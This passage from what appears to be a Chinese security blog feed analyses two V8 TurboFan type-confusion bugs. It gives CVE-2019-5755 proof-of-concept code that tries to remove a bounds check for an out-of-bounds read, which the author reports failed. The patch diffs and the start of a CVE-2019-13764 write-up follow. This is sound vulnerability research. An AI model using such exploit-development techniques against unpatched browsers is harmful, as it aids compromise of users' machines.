<blockquote>
<p>尽管理论上可以通过该漏洞构造<strong>越界读取原语</strong>，但实际利用起来仍然存在一个无法解决的问题。</p>
<p>即便如此，我们仍然可以在尝试构造漏洞利用中加深对 turboFan 的理解。</p>
</blockquote>
<p>初始 Poc 如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">trigger</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> idx = <span class="built_in">Object</span>.is((trigger ? <span class="number">-0</span> : <span class="number">0</span>) - <span class="number">0</span>, <span class="number">-0</span>);</span><br><span class="line">    <span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">false</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>)); <span class="comment">// expected: true, got: false</span></span><br></pre></td></tr></table></figure>
<p>从 turbolizer 中可以看到，不管传入函数的参数是什么，最后都将会把 SameValue 结点<strong>直接优化</strong>为 HeapConstant&lt;false&gt;，同时<strong>运行时 idx 值也是 false</strong>，两个结果相同，因此无法利用漏洞。</p>
<p>为什么运行时 idx 值也是 false 呢？因为当生成了 HeapConstant&lt;false&gt;之后，turboFan 就会直接优化变量 idx 的计算过程，直接取结果值 false：</p>
<p><img src="/2021/02/CVE-2019-5755/heapconstant_asm.png" alt="img"></p>
<p>我们<strong>希望</strong>，传入 -0 时（即传入参数 true），编译时<strong>SameValue 结点类型为 false，但运行时的结果为 true</strong>，这样就会有一个范围差，我们便可以利用它来计算出错误的范围。换句话说，我们需要让 turboFan 认为<strong>编译时</strong>的 SameValue 结点值为 0，但<strong>运行时</strong>的值是 1，这样我们才可以利用这个差值搭配乘法进行数组越界。</p>
<blockquote>
<p><strong>编译时</strong>的值：turboFan 执行 type 时所确认的值/范围，即静态分析时确定的数值。</p>
<p><strong>运行时</strong>的值，终端调用 v8 执行 JS 程序时最终计算出的值。</p>
</blockquote>
<p>因此，我们就必须<strong>禁止 turboFan 为 SameValue 结点生成 HeapConstant&lt;false&gt;结点</strong>，也就是说我们就必须在执行 simplified lowering 前的所有 ConstantFoldingReducer 时，<strong>不精确计算出</strong> SameValue 的类型，即推迟该节点被 type 为 HeapConstant 的时机至<strong>执行完所有 ConstantFoldingReducer  之后</strong>。否则一旦出现 HeapConstant，则<strong>运行时</strong>的 idx 变量值就固定为该 HeapConstant，不会再重新计算。</p>
<p>那么，我们该让 SameValue 在什么时候被精确 type 呢？我们先看一下整个 pipeline 中运行 typer 的地方有哪些：</p>
<ul>
<li>TyperPhase 阶段</li>
<li>LoadEliminationPhase 阶段中的 TypeNarrowingReducer 函数</li>
<li>SimplifiedLoweringPhase 阶段中的 UpdateFeedbackType 函数</li>
</ul>
<blockquote>
<p>后两种是通过以下宏定义来调用 typer（咋一看还没认出来）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_CASE(Name)                               \</span></span><br><span class="line">  <span class="keyword">case</span> IrOpcode::k##Name: &#123;                              \</span><br><span class="line">    new_type = op_typer_.Name(input0_type, input1_type); \</span><br><span class="line">    <span class="keyword">break</span>;                                               \</span><br><span class="line">  &#125;</span><br><span class="line">      SIMPLIFIED_NUMBER_BINOP_LIST(DECLARE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> DECLARE_CASE</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>而 ConstantFoldingReducer 出现在 <code>TypedLoweringPhase</code> 和 <code>LoadEliminationPhase</code>。因此我们只能让 SameValue 在 <strong>SimplifiedLoweringPhase</strong> 阶段被精确 type。</p>
<p>但需要注意的是，TypedOptimization in TypedLoweringPhase 将会对 SameValue 进行一次 reduce 操作。我们必须阻止它将 SameValue 结点优化成 ObjectIsMinusZero 结点，因为该结点将不会在 simplifedLoweringPhase 中进行 type（只会进行节点替换，替换成 Int32Constant）。</p>
<p>综合上面的要求，我们不能让 turboFan 在 EscapeAnalysisPhase 之前的 Phase 中，确认出 SameValue 的第二个 操作数类型为 MinusZero。因此，就需要引入一点点 EscapeAnalysis 的内容 （完整内容请查阅 <a href="https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf" target="_blank" rel="noopener">Escape-Analysis-in-V8</a>）：</p>
<p><img src="/2021/02/CVE-2019-5755/escape_analysis_writing_field.png" alt="img"></p>
<p>简单来说，EscapeAnalysis 可以但不限于<strong>将一个 LoadField 操作转换成一个栈变量读取操作</strong>。这样，在 EscapeAnalysisPhase 之前的  Phase，由于 LoadField 结点的存在，自然就无法获取到对应值的类型。因此笔者一开始将 Poc 修改为如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">trigger</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123; <span class="attr">a</span>: <span class="number">-0</span> &#125;; <span class="comment">// Escape Analysis 特供1</span></span><br><span class="line">    <span class="keyword">let</span> wrongNum = (trigger ? <span class="number">-0</span> : <span class="number">0</span>) - <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(wrongNum, obj.a);</span><br><span class="line">    <span class="keyword">return</span> idx + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Escape Analysis 特供2</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">2</span>; a++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>)); <span class="comment">// expected: true, got: false</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，Escape Analysis 对函数的 type feedback有一定的要求。如果目标函数只运行了<strong>一次</strong>，那么 escape analysis 分析效果非常的差，基本上无法分析出任何有用的东西，包括刚刚说的 LoadField 替换也无法完成。因此必须在优化前多执行几次目标函数。</p>
<p>同时，Escape Analysis 的目标对象，必须有个修饰符 let / var，否则无法替换 LoadField 结点，这其中主要是因为作用域的关系。</p>
</blockquote>
<p>但实际调试发现， LoadField 结点的替换将会被 LoadElimination（ 位于 LoadEliminationPhase） 截胡。也就是说，在 LoadEliminationPhase 时，obj.a 就会被替换成 -0。相关代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">LoadElimination::ReduceLoadField</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  FieldAccess <span class="keyword">const</span>&amp; access = FieldAccessOf(node-&gt;op());</span><br><span class="line">  Node* object = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">  Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  Node* control = NodeProperties::GetControlInput(node);</span><br><span class="line">  AbstractState <span class="keyword">const</span>* state = node_states_.Get(effect);</span><br><span class="line">  <span class="keyword">if</span> (state == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="keyword">if</span> (access.offset == HeapObject::kMapOffset &amp;&amp;</span><br><span class="line">      access.base_is_tagged == kTaggedBase) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> field_index = FieldIndexOf(access);</span><br><span class="line">    <span class="keyword">if</span> (field_index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (Node* replacement = state-&gt;LookupField(object, field_index)) &#123;</span><br><span class="line">        <span class="comment">// Make sure we don't resurrect dead &#123;replacement&#125; nodes.</span></span><br><span class="line">        <span class="keyword">if</span> (!replacement-&gt;IsDead()) &#123;</span><br><span class="line">          <span class="comment">// Introduce a TypeGuard if the type of the &#123;replacement&#125; node is not</span></span><br><span class="line">          <span class="comment">// a subtype of the original &#123;node&#125;'s type.</span></span><br><span class="line">          <span class="keyword">if</span> (!NodeProperties::GetType(replacement)</span><br><span class="line">                   .Is(NodeProperties::GetType(node))) &#123;</span><br><span class="line">            Type replacement_type = Type::Intersect(</span><br><span class="line">                NodeProperties::GetType(node),</span><br><span class="line">                NodeProperties::GetType(replacement), graph()-&gt;zone());</span><br><span class="line">            <span class="comment">// 建立新结点</span></span><br><span class="line">            replacement = effect =</span><br><span class="line">                graph()-&gt;NewNode(common()-&gt;TypeGuard(replacement_type),</span><br><span class="line">                                 replacement, effect, control);</span><br><span class="line">            <span class="comment">// type 设置</span></span><br><span class="line">            NodeProperties::SetType(replacement, replacement_type);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 结点替换</span></span><br><span class="line">          ReplaceWithValue(node, replacement, effect);</span><br><span class="line">          <span class="keyword">return</span> Replace(replacement);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      state = state-&gt;AddField(object, field_index, node, access.name, zone());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> UpdateState(node, state);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但 LoadEliminationPhase 中存在 ConstantFoldingReducer，因此最终 SameValue 结点还是会被替换成 HeapConstant。所以我们还是必须想办法绕过 LoadElimination 的优化，进入 EscapeAnalysis 中的优化。</p>
<p>折腾了相当长的时间，终于找到了绕过的方法，以下是修改后的 PoC，与之前相比，加了一行略微奇怪的 console.log 函数调用：</p>
<blockquote>
<p>这个绕过方法是蒙出来的，把代码改复杂一点有时可以非常玄学的绕过某些优化。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">trigger</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123; <span class="attr">a</span>: <span class="number">-0</span> &#125;; <span class="comment">// Escape Analysis 特供1</span></span><br><span class="line">    <span class="keyword">let</span> wrongNum = (trigger ? <span class="number">-0</span> : <span class="number">0</span>) - <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(obj.a = <span class="number">-0</span> );     <span class="comment">// 绕过 LoadElimination 特供</span></span><br><span class="line">    <span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(wrongNum, obj.a);</span><br><span class="line">    <span class="keyword">return</span> idx + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Escape Analysis 特供2</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">2</span>; a++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>)); <span class="comment">// expected: true, got: false</span></span><br></pre></td></tr></table></figure>
<p>因此我们便可以绕过LoadElimination：</p>
<p><img src="/2021/02/CVE-2019-5755/loadelimination.png" alt="img"></p>
<p>在 EscapeAnalysisPhase 完成之后，彻底完成所有的基础工作：</p>
<p><img src="/2021/02/CVE-2019-5755/escape_analysis_show1.png" alt="img"></p>
<p>之后笔者稍微修改了一下代码，添加上数组访问操作，看看能否成功优化 checkbounds 结点（原先的代码只是获取索引值）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">trigger</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> obj = &#123; <span class="attr">a</span>: <span class="number">-0</span> &#125;; <span class="comment">// Escape Analysis 特供1</span></span><br><span class="line">    <span class="keyword">let</span> wrongNum = (trigger ? <span class="number">-0</span> : <span class="number">0</span>) - <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(obj.a);     <span class="comment">// 绕过 LoadElimination 的特供语句</span></span><br><span class="line">    <span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(wrongNum, obj.a);</span><br><span class="line">    <span class="keyword">return</span> arr[idx * <span class="number">1337</span>]; <span class="comment">// 试着越界</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Escape Analysis 特供2</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">2</span>; a++)</span><br><span class="line">    foo(<span class="literal">false</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="literal">true</span>));</span><br></pre></td></tr></table></figure>
<p>观察 turbolizer，可以发现 checkbounds 结点被成功优化：</p>
<p><img src="/2021/02/CVE-2019-5755/elimate_checkbounds.png" alt="img"></p>
<p>编译生成的汇编代码貌似也没什么问题：</p>
<blockquote>
<p>Builtin_SameValue 的函数调用规范：%rdx 和 %rax 分别为左右两个操作数。</p>
</blockquote>
<p><img src="/2021/02/CVE-2019-5755/exp_asm.png" alt="img"></p>
<p>看上去应该可以成功越界读取，但实际执行时发现读取出的仍然是索引值为0的数组元素（心态崩了TAT）。</p>
<p>笔者动态调试了一下编译后 JS 函数的汇编代码，发现变量 wrongNum <strong>被截断成整型</strong>，之后与 0x1 进行比较：</p>
<blockquote>
<p>使用 <code>--trace-turbo</code> 参数 结合 turbolizer ，即时查看编译后函数的内存地址；同时搭配内置函数 <code>%SystemDebug()</code>，便于调试。</p>
</blockquote>
<p><img src="/2021/02/CVE-2019-5755/problem_asm1.png" alt="img"></p>
<p>而这实际上是 ChangeInt31ToTaggedSigned 结点的锅：</p>
<p><img src="/2021/02/CVE-2019-5755/insertNode.png" alt="img"></p>
<p>由于这个 ChangeInt31ToTaggedSigned 结点在 Simplified Lowering 阶段中生成，不可优化，因此 exp 编写就没办法继续下去，只能就此终止。</p>
<h2 id="五、后记">五、后记</h2>
<ul>
<li>
<p>该漏洞补丁的详细信息请查阅<a href="https://chromium.googlesource.com/v8/v8.git/+/e3c923962677908c183121644c945777cdb31570" target="_blank" rel="noopener">此处</a></p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">Type OperationTyper::SpeculativeSafeIntegerSubtract(Type lhs, Type rhs) &#123;</span><br><span class="line">  Type result = SpeculativeNumberSubtract(lhs, rhs);</span><br><span class="line">  // If we have a Smi or Int32 feedback, the representation selection will</span><br><span class="line">  // either truncate or it will check the inputs (i.e., deopt if not int32).</span><br><span class="line">  // In either case the result will be in the safe integer range, so we</span><br><span class="line">  // can bake in the type here. This needs to be in sync with</span><br><span class="line">  // SimplifiedLowering::VisitSpeculativeAdditiveOp.</span><br><span class="line"><span class="deletion">-  return result = Type::Intersect(result, cache_.kSafeInteger, zone());</span></span><br><span class="line"><span class="addition">+  return Type::Intersect(result, cache_.kSafeIntegerOrMinusZero, zone());</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation,</span><br><span class="line">                                         SimplifiedLowering* lowering) &#123;</span><br><span class="line">   // ...</span><br><span class="line">   </span><br><span class="line">   Type left_feedback_type = TypeOf(node-&gt;InputAt(0));</span><br><span class="line">     Type right_feedback_type = TypeOf(node-&gt;InputAt(1));</span><br><span class="line">     // Handle the case when no int32 checks on inputs are necessary (but</span><br><span class="line">     // an overflow check is needed on the output). Note that we do not</span><br><span class="line"><span class="deletion">-    // have to do any check if at most one side can be minus zero.</span></span><br><span class="line"><span class="deletion">-    if (left_upper.Is(Type::Signed32OrMinusZero()) &amp;&amp;</span></span><br><span class="line"><span class="addition">+    // have to do any check if at most one side can be minus zero. For</span></span><br><span class="line"><span class="addition">+    // subtraction we need to handle the case of -0 - 0 properly, since</span></span><br><span class="line"><span class="addition">+    // that can produce -0.</span></span><br><span class="line"><span class="addition">+    Type left_constraint_type =</span></span><br><span class="line"><span class="addition">+        node-&gt;opcode() == IrOpcode::kSpeculativeSafeIntegerAdd</span></span><br><span class="line"><span class="addition">+            ? Type::Signed32OrMinusZero()</span></span><br><span class="line"><span class="addition">+            : Type::Signed32();</span></span><br><span class="line"><span class="addition">+    if (left_upper.Is(left_constraint_type) &amp;&amp;</span></span><br><span class="line">         right_upper.Is(Type::Signed32OrMinusZero()) &amp;&amp;</span><br><span class="line">         (left_upper.Is(Type::Signed32()) || right_upper.Is(Type::Signed32()))) &#123;</span><br><span class="line">       VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                 MachineRepresentation::kWord32, Type::Signed32());</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">     // ...</span><br><span class="line">     &#125;</span><br><span class="line">     // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>漏洞修复后，原先 Poc 执行的 turbolizer 视图如下：</p>
<p><img src="/2021/02/CVE-2019-5755/patched_turbolizer.png" alt="img"></p>
<p>可以看到，SpeculativeSafeIntegerSubtra 的 Type 包含了 MinusZero 这种类型，因此下面的 SameValue 的类型也不再固定为 false， 而是<strong>不确定</strong>的 Boolean。</p>
</li>
</ul>
<h2 id="六、参考">六、参考</h2>
<ul>
<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=913296" target="_blank" rel="noopener">Issue 913296: Security: V8: Incorrect type information on SpeculativeSafeIntegerSubtract</a></li>
<li><a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/" target="_blank" rel="noopener">Exploiting the Math.expm1 typing bug in V8 - 0x41414141 in ??()</a></li>
<li><a href="https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf" target="_blank" rel="noopener">Escape-Analysis-in-V8</a></li>
<li><a href="https://cy2cs.top/2020/05/07/v8-math-expm1-%e7%b1%bb%e5%9e%8b%e9%94%99%e8%af%af%e5%af%bc%e8%87%b4%e7%9a%84%e6%bc%8f%e6%b4%9e/" target="_blank" rel="noopener">v8-math-expm1-类型错误导致的漏洞</a></li>
</ul>
]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>v8</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-13764 分析</title>
    <url>/2021/02/CVE-2019-13764/</url>
    <content><![CDATA[<h2 id="一、前言">一、前言</h2>
<ul>
<li>
<p>CVE-2019-13764 是 v8 中的一个位于  JIT TyperPhase  <code>TypeInductionVariablePhi</code> 函数的漏洞。我们可以通过这个例子简单学习一下 TyperPhase 中对 InductionVariablePhi 的处理方式，以及越界读取构造方式。</p>
</li>
<li>
<p>复现用的 v8 版本为 <code>7.8.279.23</code>（chromium 78.0.3904.108） 。</p>
</li>
</ul>
<a id="more"></a>
<h2 id="二、环境搭建">二、环境搭建</h2>
<ul>
<li>
<p>切换 v8 版本，然后编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 7.8.279.23</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>启动 turbolizer。如果原先版本的 turbolizer 无法使用，则可以使用在线版本的 <a href="https://v8.github.io/tools/head/turbolizer/index.html" target="_blank" rel="noopener">turbolizer</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer 8000&amp;</span><br><span class="line">google-chrome http://127.0.0.1:8000</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="三、漏洞细节">三、漏洞细节</h2>
<ul>
<li>
<p>在循环变量分析中，当initial_type 与 increment_type 相结合，则可以通过两个不同符号的无穷大相加产生NaN结果（即 <strong>-inf + inf == NaN</strong>）。这将<strong>进入 turboFan 认为是 unreachable code 的代码区域</strong>，触发 SIGTRAP 崩溃。</p>
</li>
<li>
<p>以下是漏洞函数的源码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Type Typer::Visitor::TypeInductionVariablePhi(Node* node) &#123;</span><br><span class="line">  <span class="keyword">int</span> arity = NodeProperties::GetControlInput(node)-&gt;op()-&gt;ControlInputCount();</span><br><span class="line">  DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());</span><br><span class="line">  DCHECK_EQ(<span class="number">2</span>, NodeProperties::GetControlInput(node)-&gt;InputCount());</span><br><span class="line"></span><br><span class="line">  Type initial_type = Operand(node, <span class="number">0</span>);</span><br><span class="line">  Type increment_type = Operand(node, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// We only handle integer induction variables (otherwise ranges</span></span><br><span class="line">  <span class="comment">// do not apply and we cannot do anything).</span></span><br><span class="line">  <span class="comment">// 检测 intial_type &amp;&amp; increment_type 是否都是 integer 类型</span></span><br><span class="line">  <span class="keyword">if</span> (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||</span><br><span class="line">      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger)) &#123;</span><br><span class="line">    <span class="comment">// Fallback to normal phi typing, but ensure monotonicity.</span></span><br><span class="line">    <span class="comment">// (Unfortunately, without baking in the previous type, monotonicity might</span></span><br><span class="line">    <span class="comment">// be violated because we might not yet have retyped the incrementing</span></span><br><span class="line">    <span class="comment">// operation even though the increment's type might been already reflected</span></span><br><span class="line">    <span class="comment">// in the induction variable phi.)</span></span><br><span class="line">    <span class="comment">// 如果不满足条件，则回退至保守的 phi typer。</span></span><br><span class="line">    Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)</span><br><span class="line">                                              : Type::None();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arity; ++i) &#123;</span><br><span class="line">      type = Type::Union(type, Operand(node, i), zone());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now process the bounds.</span></span><br><span class="line">  <span class="comment">// 开始处理 bounds，获取最终的 min 和 max 值。</span></span><br><span class="line">  <span class="keyword">auto</span> res = induction_vars_-&gt;induction_variables().find(node-&gt;id());</span><br><span class="line">  DCHECK(res != induction_vars_-&gt;induction_variables().end());</span><br><span class="line">  InductionVariable* induction_var = res-&gt;second;</span><br><span class="line"></span><br><span class="line">  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">double</span> min = -V8_INFINITY;</span><br><span class="line">  <span class="keyword">double</span> max = V8_INFINITY;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取实际的 min 和 max。</span></span><br><span class="line"><span class="comment">     其中</span></span><br><span class="line"><span class="comment">     1. 对于循环是增量的情况（即increment_min &gt;= 0）：</span></span><br><span class="line"><span class="comment">      - min = initial_type.Min();</span></span><br><span class="line"><span class="comment">      - max = std::min(max, bound_max + increment_max);</span></span><br><span class="line"><span class="comment">        max = std::max(max, initial_type.Max());   </span></span><br><span class="line"><span class="comment">     2. 对于循环是减量的情况（即increment_max &lt;= 0）：</span></span><br><span class="line"><span class="comment">      - max = initial_type.Max();</span></span><br><span class="line"><span class="comment">      - min = std::max(min, bound_min + increment_min);</span></span><br><span class="line"><span class="comment">        min = std::min(min, initial_type.Min());</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, typer_-&gt;zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述源码只是简单的判断了一下 initial_type 和 increment_type 的类型是否全为 Integer，如果不满足条件则使用保守的 typer；但这其中并没有判断出现 NaN 的情况，因此针对于某些 testcase 会产生问题。</p>
</li>
<li>
<p>当 initial value 为 <strong>infinity</strong>， increment value 为 <strong>-infinity</strong>，即类似于以下这种形式的循环：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="literal">Infinity</span>, a &gt;= <span class="number">1</span>; a += (-<span class="literal">Infinity</span>)) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>则在处理归纳变量 i 的phi结点时，由于 inital_type 和 increment_type 都是 integer 类型的，因此将不会回退至保守typer计算 type，而是继续向下执行。那么将会以下述过程执行至 return 语句，返回一个 <code>-inf ~ inf</code>的范围给当前的 InductionVariablePhi 结点：</p>
<blockquote>
<p>具体的细节均以注释的形式写入代码中。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Type Typer::Visitor::TypeInductionVariablePhi(Node* node) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// [1]. 初始时设置 min 值和 max 值为两个极端</span></span><br><span class="line">  <span class="keyword">double</span> min = -V8_INFINITY;</span><br><span class="line">  <span class="keyword">double</span> max = V8_INFINITY;</span><br><span class="line">  <span class="keyword">double</span> increment_min;</span><br><span class="line">  <span class="keyword">double</span> increment_max;</span><br><span class="line">  <span class="keyword">if</span> (arithmetic_type == InductionVariable::ArithmeticType::kAddition) &#123;</span><br><span class="line">    <span class="comment">// [2]. 由于 JS 代码中的归纳变量执行的是加法操作，即 `i += (-Infinity)`，因此控制流进入此处</span></span><br><span class="line">    increment_min = increment_type.Min();</span><br><span class="line">    increment_max = increment_type.Max();</span><br><span class="line">    <span class="comment">// 此时increment_min == increment_max = -inf</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);</span><br><span class="line">    increment_min = -increment_type.Max();</span><br><span class="line">    increment_max = -increment_type.Min();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (increment_min &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (increment_max &lt;= <span class="number">0</span>) </span><br><span class="line">    <span class="comment">// [3]. 由于 increment_max == -inf，因此进入当前分支</span></span><br><span class="line">    <span class="comment">// decreasing sequence</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取当前分支的最大值 max，该 max 值将在下面不再更改</span></span><br><span class="line">    <span class="comment">// 此时 max == inf</span></span><br><span class="line">    max = initial_type.Max();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> bound : induction_var-&gt;lower_bounds()) &#123;</span><br><span class="line">      <span class="comment">// [4]. 对于判断语句中的每个比较操作，即获取 bound类型和值</span></span><br><span class="line">      Type bound_type = TypeOrNone(bound.bound);</span><br><span class="line">      <span class="comment">// If the type is not an integer, just skip the bound.</span></span><br><span class="line">      <span class="keyword">if</span> (!bound_type.Is(typer_-&gt;cache_-&gt;kInteger)) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">// If the type is not inhabited, then we can take the initial value.</span></span><br><span class="line">      <span class="keyword">if</span> (bound_type.IsNone()) &#123;</span><br><span class="line">        min = initial_type.Min();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对于上述例子，此时的 bound_min == bound_max = 1</span></span><br><span class="line">      <span class="keyword">double</span> bound_min = bound_type.Min();</span><br><span class="line">      <span class="keyword">if</span> (bound.kind == InductionVariable::kStrict) &#123;</span><br><span class="line">        bound_min += <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 设置min值，由于 max 函数的两个参数都与 -inf 相关，因此设置 min 为 -inf</span></span><br><span class="line">      min = <span class="built_in">std</span>::max(min, bound_min + increment_min);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// The lower bound must be at most the initial value's lower bound.</span></span><br><span class="line">    <span class="comment">// [5]. 由于 -inf &lt; inf，因此再次设置 min 值为 -inf</span></span><br><span class="line">    min = <span class="built_in">std</span>::min(min, initial_type.Min());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Shortcut: If the increment can be both positive and negative,</span></span><br><span class="line">    <span class="comment">// the variable can go arbitrarily far, so just return integer.</span></span><br><span class="line">    <span class="keyword">return</span> typer_-&gt;cache_-&gt;kInteger;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// [6]. 返回 Range(-inf, inf)，即返回了一个错误的范围</span></span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, typer_-&gt;zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 min 值的赋值处（即[4]、[5]），原先的代码预期 <strong>min 值范围为</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">initial_type.Min &lt;= min &lt;= bound_min + increment_type.Min</span><br></pre></td></tr></table></figure>
<p>但由于 <strong>initial_type.Min == inf；increment_type.Min == -inf</strong>，因此 min 值将沿以下链进行变化：</p>
